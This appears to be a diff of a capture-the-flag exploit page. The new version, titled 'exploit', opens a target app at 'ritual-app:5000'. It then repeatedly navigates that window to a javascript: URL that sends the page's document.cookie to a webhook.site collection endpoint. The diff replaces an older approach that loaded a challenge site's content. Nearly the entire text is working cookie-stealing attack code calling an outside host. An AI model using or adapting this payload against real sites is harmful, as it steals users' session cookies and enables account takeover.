@@ -1,15 +1,22 @@
 <!doctype html>
 <meta charset="utf-8">
+<title>exploit</title>
 <script>
-const chall = 'http://chal.polyuctf.com:43042';
-const id = 'a3b74a327a68434af4e108c8a9c986a44717a07219b3bd4b4aabf20b8d0c2724';
+const WEBHOOK = "https://webhook.site/17319d7a-3d98-427b-83ae-6a3cddad1e1a";
+const TARGET = "http://ritual-app:5000/nope";
 
-const w = open('about:blank');
-if (w) {
-  w.location = `${chall}/sites/${id}`;
+const w = window.open(TARGET, "_blank");
 
-  setTimeout(() => {
-    w.location.replace(`${chall}/api/sites/${id}/content`);
-  }, 2500);
-}
+let tried = 0;
+const t = setInterval(() => {
+  try {
+    w.location =
+      "javascript:(()=>{" +
+      "location='" + WEBHOOK + "?c='+encodeURIComponent(document.cookie)" +
+      "})()";
+  } catch (e) {}
+
+  tried++;
+  if (tried > 15) clearInterval(t);
+}, 200);
 </script>
